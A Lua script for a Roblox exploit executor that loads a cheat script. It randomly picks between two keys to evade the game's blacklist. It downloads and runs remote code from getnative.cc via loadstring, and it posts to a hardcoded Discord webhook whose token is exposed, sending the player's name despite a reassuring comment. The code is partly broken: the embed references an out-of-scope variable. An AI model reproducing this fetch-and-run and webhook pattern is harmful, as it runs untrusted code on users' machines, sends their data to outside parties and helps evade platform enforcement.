-- inspect fully the SCRIPT!!

print("afkar-gg on github")
jjkloskl = "thescriptkey1" -- your script key (https://getnative.cc/linkvertise)
sukmadik = "thescriptkey2" -- you can put the key on above or paste another new key

coin_flip = math.random(0, 1) -- randomize key for evading blacklist (optional to do)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if LocalPlayer then
    local playerName = LocalPlayer.Name
    print("Hello, " .. playerName .. "!")
end

local MarketplaceService = game:GetService("MarketplaceService")

local success, productInfo = pcall(function()
    return MarketplaceService:GetProductInfo(game.PlaceId, Enum.InfoType.Place)
end)


-- webhook stuff (dw im not gonna hack u)

function SendMessage(url, message)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["content"] = message
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end

function SendMessageEMBED(url, embed)
    local http = game:GetService("HttpService")
    local headers = {
        ["Content-Type"] = "application/json"
    }
    local data = {
        ["embeds"] = {
            {
                ["title"] = embed.title,
                ["description"] = embed.description,
                ["color"] = embed.color,
                ["fields"] = embed.fields,
                ["footer"] = {
                    ["text"] = embed.footer.text
                }
            }
        }
    }
    local body = http:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = body
    })
    print("Sent")
end


local url = "https://discord.com/api/webhooks/1379133663626662020/AXUUlu0lkieQ8BPD6gMVBYLJPwtefzw9Xifseli75ZhgRPxwTEroDmDpg-RCHyYCDBQX"  -- discord webhook (change before exec)

SendMessage(url, "<@1339276821308375131>") -- the thing in quotation mark are the message the bot will send to, so change it

if coin_flip == 0 then
    script_key = jjkloskl;
(loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()
else
    script_key = sukmadik;
(loadstring or load)(game:HttpGet("https://getnative.cc/script/loader"))()
end

local embed = {
    ["title"] = "This is an embedded message",
    ["description"] = "This message has an embed with fields and a footer",
    ["color"] = 65280,
    ["fields"] = {
        {
            ["name"] = "Current User : " ..playerName.. "",
            ["value"] = "Current key : script_key"
        },
    },
}
SendMessageEMBED(url, embed)
